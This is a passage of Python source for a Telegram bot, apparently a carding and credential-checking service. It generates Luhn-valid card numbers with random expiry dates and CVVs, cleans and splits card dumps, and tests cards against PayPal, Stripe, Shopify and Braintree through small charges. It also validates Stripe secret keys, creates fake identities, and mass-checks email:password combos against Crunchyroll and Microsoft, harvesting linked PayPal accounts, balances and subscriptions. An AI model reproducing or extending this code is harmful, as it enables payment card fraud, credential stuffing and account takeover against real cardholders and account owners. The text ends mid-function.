async def gbin_receive_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    
    bin_types = {
        '1': ('Visa', ['4']),
        '2': ('Mastercard', ['51', '52', '53', '54', '55', '22', '23', '24', '25', '26', '27']),
        '3': ('American Express', ['34', '37']),
        '4': ('Discover', ['6011', '65'])
    }
    
    if user_input not in bin_types:
        await update.message.reply_text("❌ Please enter a number between 1-4")
        return GBIN_WAITING_TYPE
    
    context.user_data['gbin_type_name'] = bin_types[user_input][0]
    context.user_data['gbin_prefixes'] = bin_types[user_input][1]
    
    await update.message.reply_text(
        "How many digits do you need in the BIN? (5 or 6)"
    )
    return GBIN_WAITING_DIGITS

async def gbin_receive_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import random
    
    user_input = update.message.text.strip()
    
    if user_input not in ['5', '6']:
        await update.message.reply_text("❌ Please enter either 5 or 6")
        return GBIN_WAITING_DIGITS
    
    digit_count = int(user_input)
    quantity = context.user_data.get('gbin_quantity', 10)
    type_name = context.user_data.get('gbin_type_name', 'Unknown')
    prefixes = context.user_data.get('gbin_prefixes', ['4'])
    
    bins = []
    for _ in range(quantity):
        prefix = random.choice(prefixes)
        remaining_digits = digit_count - len(prefix)
        random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits)])
        bin_number = prefix + random_part
        bins.append(bin_number)
    
    result = (
        f"╔═════════════════════════╗\n"
        f"   🎲 𝗕𝗜𝗡 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥\n"
        f"╚═════════════════════════╝\n\n"
        f"💳 Type: {type_name}\n"
        f"🔢 Digits: {digit_count}\n"
        f"📊 Quantity: {quantity}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        + "\n".join(bins) +
        "\n\n━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(result)
    
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_gbin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ BIN generation cancelled.")
    context.user_data.clear()
    return ConversationHandler.END

def parse_card(card_string):
    patterns = [
        r'(\d{15,16})[|/\s:]+(\d{1,2})[|/\s:]+(\d{2,4})[|/\s:]+(\d{3,4})',
        r'(\d{15,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            return {
                'number': match.group(1),
                'month': match.group(2).zfill(2),
                'year': match.group(3) if len(match.group(3)) == 4 else '20' + match.group(3),
                'cvv': match.group(4)
            }
    return None

def luhn_checksum(card_number):
    """Calculate Luhn checksum for card validation"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def detect_card_type(bin_str):
    """Detect card type from BIN and return (type, length, cvv_length)"""
    bin_2 = bin_str[:2]
    bin_3 = bin_str[:3]
    bin_4 = bin_str[:4]
    
    try:
        bin_num = int(bin_str[:4]) if len(bin_str) >= 4 else int(bin_str)
    except:
        bin_num = 0
    
    if bin_2 in ('34', '37'):
        return ('Amex', 15, 4)
    elif bin_str.startswith('4'):
        return ('Visa', 16, 3)
    elif bin_2 in ('51', '52', '53', '54', '55'):
        return ('Mastercard', 16, 3)
    elif bin_num >= 2221 and bin_num <= 2720:
        return ('Mastercard', 16, 3)
    elif bin_4 == '6011' or bin_2 == '65' or (bin_num >= 6440 and bin_num <= 6499):
        return ('Discover', 16, 3)
    elif bin_2 in ('62', '81'):
        return ('UnionPay', 16, 3)
    elif bin_2 == '35' or bin_4 in ('2131', '1800'):
        return ('JCB', 16, 3)
    elif bin_3 in ('300', '301', '302', '303', '304', '305', '309') or bin_2 in ('36', '38', '39'):
        return ('Diners Club', 14, 3)
    elif bin_4 in ('5018', '5020', '5038', '5612', '5893', '6304', '6759', '6761', '6762', '6763', '0604', '6390'):
        return ('Maestro', 16, 3)
    elif bin_2 in ('50', '56', '57', '58', '67', '68', '69'):
        return ('Maestro', 16, 3)
    else:
        return ('Unknown', 16, 3)

def generate_card_number(bin_number):
    """Generate a valid card number with Luhn check for any card type"""
    import random
    
    bin_str = str(bin_number)
    card_type, target_length, cvv_length = detect_card_type(bin_str)
    
    while len(bin_str) < target_length - 1:
        bin_str += str(random.randint(0, 9))
    
    for check_digit in range(10):
        card = bin_str + str(check_digit)
        if luhn_checksum(card) == 0:
            return card
    
    return bin_str + '0'

def parse_partial_card(card_input):
    """Parse partial card input and return card parts with indicators for what's missing"""
    import random
    
    parts = card_input.split('|')
    
    # Default values
    card_number = None
    month = None
    year = None
    cvv = None
    
    # Parse card number (first part)
    if len(parts) >= 1 and parts[0].strip():
        card_number = parts[0].strip()
    
    # Parse month (second part)
    if len(parts) >= 2 and parts[1].strip() and parts[1].strip().lower() not in ['x', 'xx', 'xxx']:
        try:
            month_val = int(parts[1].strip())
            if 1 <= month_val <= 12:
                month = str(month_val).zfill(2)
        except:
            pass
    
    # Parse year (third part)
    if len(parts) >= 3 and parts[2].strip() and parts[2].strip().lower() not in ['x', 'xx', 'xxx', 'xxxx']:
        try:
            year_val = parts[2].strip()
            if len(year_val) == 2:
                year = year_val
            elif len(year_val) == 4 and year_val.startswith('20'):
                year = year_val
            else:
                year = None
        except:
            pass
    
    # Parse CVV (fourth part)
    if len(parts) >= 4 and parts[3].strip() and parts[3].strip().lower() not in ['x', 'xx', 'xxx', 'xxxx']:
        cvv_val = parts[3].strip()
        if cvv_val.isdigit() and len(cvv_val) in [3, 4]:
            cvv = cvv_val
    
    return {
        'card_number': card_number,
        'month': month,
        'year': year,
        'cvv': cvv
    }

def fill_missing_card_parts(parsed_card, bin_number=None):
    """Fill in missing card parts with random values"""
    import random
    
    result = parsed_card.copy()
    
    # Generate card number if missing
    if not result['card_number']:
        if bin_number:
            result['card_number'] = generate_card_number(bin_number)
        else:
            result['card_number'] = '4242424242424242'
    
    # Generate month if missing
    if not result['month']:
        result['month'] = str(random.randint(1, 12)).zfill(2)
    
    # Generate year if missing
    if not result['year']:
        result['year'] = str(random.randint(2024, 2030))
    
    # Generate CVV if missing
    if not result['cvv']:
        card_type, target_length, cvv_length = detect_card_type(result['card_number'][:6] if len(result['card_number']) >= 6 else result['card_number'])
        if cvv_length == 4:
            result['cvv'] = str(random.randint(1000, 9999))
        else:
            result['cvv'] = str(random.randint(100, 999))
    
    return result

async def gen_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import random
    import io
    
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "**Card Generator** 💳\n"
            "━━━━━━━━━━━━━━━━━\n"
            "**Usage:**\n"
            "`/gen <bin> <amount>`\n"
            "`/gen <partial_card> <amount>`\n\n"
            "**Examples:**\n"
            "`/gen 424242 10`\n"
            "`/gen 5154620057209320|06|2030| 5`\n"
            "`/gen 5154620057209320|06|| 10`\n"
            "`/gen 5154620057209320||2030| 3`\n"
            "`/gen 5154620057209320|xx|xx|xxx 15`\n\n"
            "**Supported formats:**\n"
            "• Full BIN: `424242`\n"
            "• Partial card: `card|mm|yyyy|cvv`\n"
            "• Missing parts: Use `|`, `||`, or `xx`\n"
            "━━━━━━━━━━━━━━━━━",
            parse_mode='Markdown'
        )
        return
    
    try:
        # Get first argument
        first_arg = ' '.join(context.args[:-1]) if len(context.args) > 1 else context.args[0]
        
        # Get amount (last argument)
        try:
            amount = int(context.args[-1])
        except:
            await update.message.reply_text("❌ Invalid amount. Last argument must be a number.")
            return
        
        if amount < 1 or amount > 50:
            await update.message.reply_text("❌ Amount must be between 1 and 50")
            return
        
        # Detect if it's a partial card format or BIN
        is_partial_card = '|' in first_arg
        
        if is_partial_card:
            # PARTIAL CARD MODE - Parse and fill missing parts
            parsed = parse_partial_card(first_arg)
            
            # Get BIN from card number if available
            bin_number = parsed['card_number'][:6] if parsed['card_number'] and len(parsed['card_number']) >= 6 else None
            
            # Get BIN info if we have a card number
            bin_info = {}
            if bin_number:
                try:
                    response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
                    if response.status_code == 200:
                        bin_info = response.json()
                except:
                    pass
            
            # Generate cards based on the template
            cards = []
            for _ in range(amount):
                filled = fill_missing_card_parts(parsed.copy(), bin_number)
                
                # Format year properly
                year_str = filled['year']
                if len(year_str) == 4:
                    year_display = year_str
                elif len(year_str) == 2:
                    year_display = f"20{year_str}"
                else:
                    year_display = year_str
                
                cards.append(f"{filled['card_number']}|{filled['month']}|{year_display}|{filled['cvv']}")
            
            display_bin = bin_number if bin_number else "N/A"
            
        else:
            # TRADITIONAL BIN MODE
            bin_number = first_arg[:6]
            
            bin_info = {}
            try:
                response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
                if response.status_code == 200:
                    bin_info = response.json()
            except:
                pass
            
            card_type, target_length, cvv_length = detect_card_type(bin_number)
            
            cards = []
            for _ in range(amount):
                card_number = generate_card_number(bin_number)
                month = str(random.randint(1, 12)).zfill(2)
                year = random.randint(2024, 2030)
                
                if cvv_length == 4:
                    cvv = str(random.randint(1000, 9999))
                else:
                    cvv = str(random.randint(100, 999))
                
                cards.append(f"{card_number}|{month}|{year}|{cvv}")
            
            display_bin = bin_number
        
        username = update.effective_user.username or update.effective_user.first_name
        
        if amount <= 10:
            card_lines = '\n'.join([f"`{card}`" for card in cards])
            
            message = (
                f"**Card Generator** 💳\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Bin: `{display_bin}`\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"{card_lines}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Info: {bin_info.get('brand', 'N/A')}\n"
                f"ᛋ Bank: {bin_info.get('bank', 'N/A')}\n"
                f"ᛋ Country: {bin_info.get('country_name', 'N/A')}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Generate by: @{username}"
            )
            
            await update.message.reply_text(message, parse_mode='Markdown')
        else:
            file_content = '\n'.join(cards)
            file_bytes = io.BytesIO(file_content.encode('utf-8'))
            file_bytes.name = f'generated_cards_{display_bin if display_bin != "N/A" else "custom"}.txt'
            
            caption = (
                f"**Card Generator** 💳\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Bin: `{display_bin}`\n"
                f"ᛋ Amount: {amount} cards\n"
                f"ᛋ Info: {bin_info.get('brand', 'N/A')}\n"
                f"ᛋ Bank: {bin_info.get('bank', 'N/A')}\n"
                f"ᛋ Country: {bin_info.get('country_name', 'N/A')}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Generate by: @{username}"
            )
            
            await update.message.reply_document(
                document=file_bytes,
                filename=f'generated_cards_{display_bin if display_bin != "N/A" else "custom"}.txt',
                caption=caption,
                parse_mode='Markdown'
            )
            
    except ValueError:
        await update.message.reply_text("❌ Invalid amount. Please enter a number.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def me_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user = update.effective_user
    users = load_users()
    user_data = users.get(str(user.id), {})
    
    message = (
        f"╔═══════════════════════╗\n"
        f"   👤 𝗬𝗢𝗨𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘\n"
        f"╚═══════════════════════╝\n\n"
        f"🆔 User ID: `{user.id}`\n"
        f"👤 Username: @{user.username or 'N/A'}\n"
        f"📝 Name: {user.first_name or 'N/A'}\n"
        f"📅 Registered: {user_data.get('registered_at', 'N/A')[:10]}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(message)

async def fake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /fake <country_code>\n"
            "Example: /fake us",
            parse_mode='HTML'
        )
        return
    
    nationality = context.args[0].upper()
    
    processing_msg = await update.message.reply_text(
        "⏳ Generating fake identity...",
        parse_mode='HTML'
    )
    
    result = generate_fake_identity(nationality)
    message = format_fake_identity_message(result)
    
    await processing_msg.edit_text(message, parse_mode='HTML')

async def sk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /sk [stripe_secret_key]\n"
            "Example: /sk sk_test_51abc..."
        )
        return
    
    sk_key = context.args[0]
    
    processing_msg = await update.message.reply_text(
        "⏳ Checking SK key...",
        parse_mode='HTML'
    )
    
    result = check_stripe_sk(sk_key)
    message = format_sk_check_message(result)
    
    await processing_msg.edit_text(message, parse_mode='HTML')

async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_user = update.message.reply_to_message.from_user
    elif context.args:
        await update.message.reply_text("❌ Please reply to a user's message to check their info.")
        return
    else:
        target_user = update.effective_user
    
    message = (
        f"╔═══════════════════════════╗\n"
        f"   ℹ️ 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
        f"╚═══════════════════════════╝\n\n"
        f"🆔 User ID: `{target_user.id}`\n"
        f"👤 Username: @{target_user.username or 'N/A'}\n"
        f"📝 Name: {target_user.first_name or 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(message)

async def clean_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "❌ Please reply to a .txt file with /clean\n"
            "This will extract and clean all credit cards from the file."
        )
        return
    
    file = await update.message.reply_to_message.document.get_file()
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    
    cards = []
    seen = set()
    
    for line in text.split('\n'):
        card_data = parse_card(line)
        if card_data:
            formatted = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
            if formatted not in seen:
                cards.append(formatted)
                seen.add(formatted)
    
    if cards:
        cleaned_content = '\n'.join(cards)
        await update.message.reply_document(
            document=cleaned_content.encode('utf-8'),
            filename='cleaned_cards.txt',
            caption=f"✅ Cleaned {len(cards)} unique cards"
        )
    else:
        await update.message.reply_text("❌ No valid cards found in the file.")

async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "❌ Usage: Reply to a .txt file with /split <amount>\n"
            "Example: /split 100"
        )
        return
    
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("❌ Please specify the split amount.\nExample: /split 100")
        return
    
    split_size = int(context.args[0])
    
    file = await update.message.reply_to_message.document.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8', errors='ignore').split('\n')
    
    chunks = [lines[i:i + split_size] for i in range(0, len(lines), split_size)]
    
    for idx, chunk in enumerate(chunks, 1):
        chunk_content = '\n'.join(chunk)
        await update.message.reply_document(
            document=chunk_content.encode('utf-8'),
            filename=f'split_part_{idx}.txt',
            caption=f"📄 Part {idx}/{len(chunks)} ({len(chunk)} lines)"
        )

async def gate_placeholder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    gate_name = context._chat_id_and_data[1].get('gate_name', 'Unknown')
    await update.message.reply_text(
        f"⚠️ {gate_name} Gate\n"
        "━━━━━━━━━━━━━━━\n\n"
        "This feature is currently under development.\n"
        "Please check back later!"
    )

async def check_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await chk_command(update, context)

async def check_stripe_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await mchk_command(update, context)

async def check_shopify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await shopify_sh(update, context)

async def check_shopify_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await shopify_msh(update, context)

async def check_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await braintree_br(update, context)

async def check_paypal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /pp <code>CARD|MM|YY/YYYY|CVV</code>\n"
            "Example: /pp 4987780029794225|06|2030|455 or /pp 5120899002486099|09|27|543",
            parse_mode='HTML'
        )
        return
    
    card_data = context.args[0]
    
    try:
        parts = card_data.split('|')
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format. Use: <code>CARD|MM|YY/YYYY|CVV</code>",
                parse_mode='HTML'
            )
            return
        
        cc, mm, yyyy, cvv = parts
        
        if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
            await update.message.reply_text("❌ Invalid card number", parse_mode='HTML')
            return
        if not (mm.isdigit() and 1 <= int(mm) <= 12):
            await update.message.reply_text("❌ Invalid month (01-12)", parse_mode='HTML')
            return
        
        if yyyy.isdigit():
            if len(yyyy) == 2:
                yyyy = f"20{yyyy}"
            elif len(yyyy) != 4:
                await update.message.reply_text("❌ Invalid year (YY or YYYY format)", parse_mode='HTML')
                return
        else:
            await update.message.reply_text("❌ Invalid year (YY or YYYY format)", parse_mode='HTML')
            return
        
        if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
            await update.message.reply_text("❌ Invalid CVV (3-4 digits)", parse_mode='HTML')
            return
        
        checking_msg = await update.message.reply_text("⏳ Checking PayPal card...", parse_mode='HTML')
        
        import time
        import asyncio
        start_time = time.time()
        
        processor = PayPalProcessor()
        result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
        
        time_taken = round(time.time() - start_time, 2)
        
        bin_number = cc[:6]
        
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                url = f"https://bins.antipublic.cc/bins/{bin_number}"
                async with session.get(url) as response:
                    if response.status == 200:
                        bin_data = await response.json()
                        bin_type = bin_data.get('brand', 'N/A')
                        bin_country = bin_data.get('country_name', 'N/A')
                        bin_bank = bin_data.get('bank', 'N/A')
                    else:
                        bin_type = 'N/A'
                        bin_country = 'N/A'
                        bin_bank = 'N/A'
        except:
            bin_type = 'N/A'
            bin_country = 'N/A'
            bin_bank = 'N/A'
        
        card_display = f"{cc}|{mm}|{yyyy}|{cvv}"
        req_by = f"@{update.effective_user.username or update.effective_user.first_name}"
        
        if result['status'] == 'APPROVED':
            status_display = "APPROVED ✅"
        else:
            status_display = "DECLINED ❌"
        
        response_text = f"""み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐩𝐚𝐲𝐩𝐚𝐥 𝟎.𝟎𝟏$
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_display}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['msg']}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_country}
𝐁𝐀𝐍𝐊 ➜ {bin_bank}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s | 𝐏𝐫𝐨𝐱𝐲 : LIVE
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔
"""
        
        await checking_msg.edit_text(response_text, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode='HTML')

async def check_paypal_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mpp <code>CARD|MM|YY/YYYY|CVV CARD2|MM|YY/YYYY|CVV ...</code>\n"
            "Max 5 cards for users, unlimited for admins\n\n"
            "Example: /mpp 4987780029794225|06|2030|455 5120899003336863|07|28|842",
            parse_mode='HTML'
        )
        return
    
    cards_data = context.args
    
    if len(cards_data) > 5 and not is_admin(user_id, username):
        await update.message.reply_text("❌ Maximum 5 cards allowed per check for users! (Admins have unlimited access)", parse_mode='HTML')
        return
    
    await update.message.reply_text(f"⏳ Checking {len(cards_data)} PayPal card(s)...", parse_mode='HTML')
    
    import time
    import asyncio
    
    for idx, card_data in enumerate(cards_data, 1):
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                await update.message.reply_text(f"❌ Card {idx}: Invalid format", parse_mode='HTML')
                continue
            
            cc, mm, yyyy, cvv = parts
            
            if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
                await update.message.reply_text(f"❌ Card {idx}: Invalid card number", parse_mode='HTML')
                continue
            if not (mm.isdigit() and 1 <= int(mm) <= 12):
                await update.message.reply_text(f"❌ Card {idx}: Invalid month", parse_mode='HTML')
                continue
            
            if yyyy.isdigit():
                if len(yyyy) == 2:
                    yyyy = f"20{yyyy}"
                elif len(yyyy) != 4:
                    await update.message.reply_text(f"❌ Card {idx}: Invalid year", parse_mode='HTML')
                    continue
            else:
                await update.message.reply_text(f"❌ Card {idx}: Invalid year", parse_mode='HTML')
                continue
            
            if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
                await update.message.reply_text(f"❌ Card {idx}: Invalid CVV", parse_mode='HTML')
                continue
            
            start_time = time.time()
            
            processor = PayPalProcessor()
            result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
            
            time_taken = round(time.time() - start_time, 2)
            
            bin_number = cc[:6]
            
            try:
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    url = f"https://bins.antipublic.cc/bins/{bin_number}"
                    async with session.get(url) as response:
                        if response.status == 200:
                            bin_data = await response.json()
                            bin_type = bin_data.get('brand', 'N/A')
                            bin_country = bin_data.get('country_name', 'N/A')
                            bin_bank = bin_data.get('bank', 'N/A')
                        else:
                            bin_type = 'N/A'
                            bin_country = 'N/A'
                            bin_bank = 'N/A'
            except:
                bin_type = 'N/A'
                bin_country = 'N/A'
                bin_bank = 'N/A'
            
            card_display = f"{cc}|{mm}|{yyyy}|{cvv}"
            req_by = f"@{update.effective_user.username or update.effective_user.first_name}"
            
            if result['status'] == 'APPROVED':
                status_display = "APPROVED ✅"
            else:
                status_display = "DECLINED ❌"
            
            response_text = f"""み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐩𝐚𝐲𝐩𝐚𝐥 𝟎.𝟎𝟏$ [{idx}/{len(cards_data)}]
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_display}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['msg']}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_country}
𝐁𝐀𝐍𝐊 ➜ {bin_bank}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s | 𝐏𝐫𝐨𝐱𝐲 : LIVE
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔
"""
            
            await update.message.reply_text(response_text, parse_mode='HTML')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Card {idx}: Error - {str(e)}", parse_mode='HTML')

async def check_crunchyroll(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text("❌ **Usage:** `/cr email:password`")
        return
    
    account_data = ' '.join(context.args)
    
    # Parse email:password
    if ':' in account_data:
        parts = account_data.split(':', 1)
        email, password = parts[0].strip(), parts[1].strip()
    elif '|' in account_data:
        parts = account_data.split('|', 1)
        email, password = parts[0].strip(), parts[1].strip()
    else:
        await update.message.reply_text("❌ **Invalid format!** Use: `/cr email:password`")
        return
    
    checking_msg = await update.message.reply_text("🔄 **Checking Crunchyroll account...**")
    
    checker = CrunchyrollChecker()
    result = await checker.check_account(email, password)
    
    if result['success']:
        response = f"✅ **VALID ACCOUNT**\n━━━━━━━━━━━━━━━\n📧 Email: `{email}`\n🔑 Status: {result['status']}\n💬 {result['message']}"
    else:
        response = f"❌ **INVALID ACCOUNT**\n━━━━━━━━━━━━━━━\n📧 Email: `{email}`\n🔑 Status: {result['status']}\n💬 {result['message']}"
    
    await checking_msg.edit_text(response, parse_mode='Markdown')

async def check_crunchyroll_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user_id = update.effective_user.id
    
    if context.args:
        accounts_text = ' '.join(context.args)
        accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
            return
        context.user_data['accounts'] = accounts
        await process_crunchyroll_accounts(update, context)
    else:
        await update.message.reply_text(
            "📋 Mass Crunchyroll Checker\n\n"
            "Send email:password combos (one per line) or separated by comma\n\n"
            "Supported formats:\n"
            "• email:password\n"
            "• email|password\n\n"
            "Max: 5000 for users, unlimited for admins"
        )
        return CR_WAITING_ACCOUNTS

async def check_microsoft(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /ms email:password")
        return
    
    account_data = ' '.join(context.args)
    
    if ':' not in account_data and '|' not in account_data:
        await update.message.reply_text("❌ Invalid format! Use: /ms email:password")
        return
    
    if ':' in account_data:
        email, password = account_data.split(':', 1)
    else:
        email, password = account_data.split('|', 1)
    
    email, password = email.strip(), password.strip()
    checking_msg = await update.message.reply_text("🔄 Checking Microsoft account...")
    
    try:
        proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
        checker = AdvancedHotmailChecker(proxies=proxies)
        result = await checker.check_account(email, password)
        
        if result.status == "SUCCESS":
            response = "✅ 𝗩𝗔𝗟𝗜𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━\n"
            response += f"📧 Email: `{email}`\n"
            response += f"🔑 Password: `{password}`\n"
            response += f"🟢 Status: SUCCESS\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━\n"
            
            if result.name:
                response += f"👤 Name: {result.name}\n"
            if result.country:
                response += f"🌍 Country: {result.country}\n"
            if result.birthdate:
                response += f"🎂 Birth: {result.birthdate}\n"
            
            response += "\n📊 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝗳𝗼:\n"
            if result.unread_messages is not None:
                response += f"📬 Unread: {result.unread_messages}\n"
            if result.total_messages is not None:
                response += f"📨 Total: {result.total_messages}\n"
            if result.inbox_count is not None:
                response += f"📥 Inbox: {result.inbox_count}\n"
            
            response += "\n💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 & 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻𝘀:\n"
            
            if result.netflix_subscription:
                response += "✅ Netflix: YES\n"
            else:
                response += "❌ Netflix: NO\n"
            
            if result.disney_subscription:
                response += "✅ Disney+: YES\n"
            else:
                response += "❌ Disney+: NO\n"
            
            if result.xbox_linked:
                response += "✅ Xbox: LINKED\n"
            else:
                response += "❌ Xbox: NOT LINKED\n"
            
            if result.paypal_email:
                response += f"✅ PayPal: {result.paypal_email}\n"
            else:
                response += "❌ PayPal: NO\n"
            
            if result.supercell_linked:
                response += "✅ Supercell: LINKED\n"
            else:
                response += "❌ Supercell: NO\n"
            
            if result.payment_balance:
                response += f"\n💰 Balance: ${result.payment_balance}\n"
            
            if result.payment_methods:
                response += f"💳 Methods: {', '.join(result.payment_methods)}\n"
            
            if result.total_orders:
                response += f"🛍 Orders: {result.total_orders}\n"
            
            response += "━━━━━━━━━━━━━━━━━━━━━━"
        elif result.status == "2FACTOR":
            response = f"⚠️ 2FA ENABLED\n━━━━━━━━━━━━━━━\n📧 Email: {email}\n🔑 Status: {result.status}"
        else:
